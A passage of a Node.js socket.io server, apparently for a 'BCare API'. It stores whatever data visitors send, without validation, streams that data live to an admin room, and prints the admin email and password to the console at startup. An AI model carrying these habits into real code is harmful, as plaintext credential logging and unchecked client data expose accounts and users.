    db.saveVisitor(visitorId, { isOnline: true, lastSeen: new Date().toISOString() });
    io.to("admins").emit("admin:visitor_online", { visitorId });
    broadcastVisitorList();

    socket.on("visitor:update", (data) => {
      db.saveVisitor(visitorId, data || {});
      io.to("admins").emit("admin:visitor_data_updated", { visitorId, payload: data || {} });
      broadcastVisitorList();
    });
  }
});

server.listen(PORT, () => {
  console.log(`BCare API running on http://localhost:${PORT}`);
  console.log(`API base: http://localhost:${PORT}/api-backend`);
  console.log(`Admin login: ${ADMIN_EMAIL} / ${ADMIN_PASSWORD}`);
});
